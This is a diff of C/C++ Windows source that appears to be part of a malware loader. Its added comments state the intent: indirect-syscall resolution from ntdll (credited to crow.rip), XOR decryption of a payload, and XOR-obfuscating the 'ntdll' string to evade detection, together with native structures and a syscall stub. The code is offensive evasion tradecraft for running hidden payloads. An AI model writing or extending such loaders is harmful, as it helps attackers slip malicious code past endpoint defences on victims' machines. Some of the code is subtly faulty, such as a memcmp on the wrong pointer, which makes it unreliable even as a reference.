@@ -7,52 +7,42 @@
 #define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
 #define MAX_WSTR_SIZE 512
 
+//IndirectPrelude code provided by crow.rip
 BOOL IndirectPrelude(IN HMODULE hNTDLL, IN LPCSTR NtFunction, OUT UINT_PTR* Syscall) {
-
 	UINT_PTR NtFunctionAddress = NULL;
 	BYTE SyscallOpcode[2] = { 0x0F, 0x05 };
-
-	info("beginning indirect prelude...");
-	info("trying to get the address of %s...", NtFunction);
 	NtFunctionAddress = (UINT_PTR)GetProcAddress(hNTDLL, NtFunction);
-
 	if (NtFunctionAddress == NULL) {
 		warn("[GetProcAddress] failed, error: 0x%lx", GetLastError());
 		return NULL;
 	}
-
-	okay("got the address of %s! (0x%p)", NtFunction, NtFunctionAddress);
 	*Syscall = NtFunctionAddress + 0x12;
-
 	if (memcmp(SyscallOpcode, Syscall, sizeof(SyscallOpcode)) == 0) {
-		okay("syscall signature (0x0F, 0x05) matched, found a valid syscall instruction!");
 	}
 	else {
-		warn("expected syscall signature: 0x0f,0x05 didn't match.");
 		return NULL;
 	}
-
-	printf("\n\t| %s ", NtFunction);
-	printf("\n\t|\n\t| ADDRESS\t| 0x%p\n\t| SYSCALL\t| 0x%p\n\t|____________________________________\n\n", NtFunctionAddress, *Syscall);
 }
 
+//define xor decryption method for payload
 void xor_decrypt(unsigned char* data, int data_length, const char* key) {
 	int key_length = strlen(key);
 	for (int i = 0; i < data_length; ++i) {
-		data[i] ^= key[i % key_length]; // XOR with key character
+		data[i] ^= key[i % key_length];
 	}
 }
 
+//define method for converting decrypted ntdll string to LPCWSTR
 LPCWSTR ConvertToLPCWSTR(const char* str) {
 	static wchar_t wstr[MAX_WSTR_SIZE];
 	int size = MultiByteToWideChar(CP_ACP, 0, str, -1, wstr, MAX_WSTR_SIZE);
 	if (size == 0) {
-		// Handle error, e.g., return NULL or take appropriate action
 		return nullptr;
 	}
 	return wstr;
 }
 
+//define method for decrypting NTDLL to avoid string used in code
 void DecryptXOR(char* encrypted_data, size_t data_length, const char* key, size_t key_length) {
 	int key_index = 0;
 	for (size_t i = 0; i < data_length; i++) {
@@ -63,7 +53,7 @@ void DecryptXOR(char* encrypted_data, size_t data_length, const char* key, size_
 }
 
 
-//structs
+//define all structures
 typedef struct _UNICODE_STRING
 {
 	USHORT Length;
@@ -112,7 +102,7 @@ typedef struct _INITIAL_TEB {
 }INITIAL_TEB, * PINITIAL_TEB;
 
 
-//syscall definitions
+//define syscalls
 EXTERN_C NTSTATUS OP(
 	OUT PHANDLE pH,
 	IN ACCESS_MASK DesiredAccess,
